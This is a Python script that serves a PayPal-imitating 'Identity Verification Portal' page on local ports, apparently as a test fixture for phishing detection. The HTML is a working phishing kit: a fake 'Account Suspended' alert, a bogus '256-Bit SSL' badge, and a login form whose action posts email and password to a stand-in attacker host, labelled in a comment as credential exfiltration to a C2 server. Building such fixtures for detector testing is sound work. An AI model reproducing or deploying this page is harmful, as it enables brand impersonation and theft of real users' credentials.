import http.server
import socketserver
import threading

PORT = 8088
socketserver.TCPServer.allow_reuse_address = True

HTML_CONTENT = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PayPal - Secure Verification Login</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #f5f7fa;
      color: #2c2e2f;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      box-sizing: border-box;
    }
    .login-box {
      background: #ffffff;
      border: 1px solid #e1e7ec;
      padding: 36px 32px;
      border-radius: 16px;
      width: 380px;
      max-width: 90vw;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
      box-sizing: border-box;
    }
    .paypal-logo-wrap {
      text-align: center;
      margin-bottom: 20px;
    }
    .brand {
      font-size: 28px;
      font-weight: 900;
      letter-spacing: -0.5px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }
    .brand-pay { color: #003087; }
    .brand-pal { color: #0079C1; }
    .auth-subtitle {
      font-size: 13px;
      color: #545d68;
      margin-top: 4px;
      font-weight: 600;
      text-align: center;
    }
    .warning-box {
      background: #fff1f2;
      border: 1px solid #fecdd3;
      border-left: 4px solid #e11d48;
      border-radius: 8px;
      padding: 10px 12px;
      margin-bottom: 20px;
    }
    .warning-title {
      color: #9f1239;
      font-size: 11px;
      font-weight: 800;
      display: flex;
      align-items: center;
      gap: 5px;
      margin-bottom: 3px;
      text-transform: uppercase;
      letter-spacing: 0.3px;
    }
    .warning-desc {
      color: #be123c;
      font-size: 11px;
      line-height: 1.45;
      font-weight: 500;
    }
    label {
      font-size: 12.5px;
      color: #334155;
      font-weight: 600;
      display: block;
      margin-bottom: 6px;
    }
    input {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 16px;
      border-radius: 8px;
      border: 1.5px solid #cbd5e1;
      background: #ffffff;
      color: #0f172a;
      box-sizing: border-box;
      font-size: 14px;
      transition: all 0.2s ease;
      outline: none;
    }
    input:focus {
      border-color: #0070ba;
      box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.15);
    }
    input::placeholder {
      color: #94a3b8;
    }
    button {
      width: 100%;
      padding: 13px;
      background: #0070ba;
      color: #ffffff;
      border: none;
      border-radius: 24px;
      font-weight: 700;
      font-size: 14px;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(0, 112, 186, 0.25);
      transition: all 0.2s ease;
      margin-top: 6px;
    }
    button:hover {
      background: #003087;
      box-shadow: 0 6px 16px rgba(0, 48, 135, 0.3);
    }
    .footer-links {
      margin-top: 22px;
      text-align: center;
      font-size: 11.5px;
      color: #64748b;
    }
    .footer-links a {
      color: #0070ba;
      text-decoration: none;
      font-weight: 600;
    }
    .footer-links a:hover {
      text-decoration: underline;
    }
    .lock-indicator {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      margin-top: 16px;
      font-size: 11px;
      color: #64748b;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="paypal-logo-wrap">
      <div class="brand">
        <span class="brand-pay">Pay</span><span class="brand-pal">Pal</span>
      </div>
      <div class="auth-subtitle">Identity Verification Portal</div>
    </div>
    
    <div class="warning-box">
      <div class="warning-title">⚠️ Account Suspended</div>
      <div class="warning-desc">Unusual activity detected. Verify your password to restore immediate access.</div>
    </div>
    
    <!-- MISMATCHED ORIGIN FORM TARGET: Submits credentials to attacker C2 server -->
    <form action="http://exfiltrate-stolen-credentials.attacker-c2.net/steal" method="POST">
      <label for="emailInput">Account Email or Phone</label>
      <input id="emailInput" type="email" placeholder="user@paypal-verify.com" required>
      
      <label for="passwordInput">Password</label>
      <input id="passwordInput" type="password" placeholder="••••••••••••" required>
      
      <button type="submit">Verify & Log In</button>
    </form>

    <div class="lock-indicator">
      <span>🔒</span> 256-Bit SSL Encrypted Verification
    </div>

    <div class="footer-links">
      Having trouble? <a href="#">Recover Account</a> • <a href="#">Security Center</a>
    </div>
  </div>
</body>
</html>
"""

class TestPhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML_CONTENT.encode('utf-8'))

class DualTCPServer(socketserver.TCPServer):
    allow_reuse_address = True

def serve_on_port(port):
    try:
        with DualTCPServer(("", port), TestPhishingHandler) as httpd:
            print(f"Test Phishing Portal running on http://localhost:{port}/login")
            httpd.serve_forever()
    except Exception as e:
        print(f"Could not bind on port {port}: {e}")

if __name__ == '__main__':
    t1 = threading.Thread(target=serve_on_port, args=(8088,), daemon=True)
    t1.start()
    serve_on_port(8080)
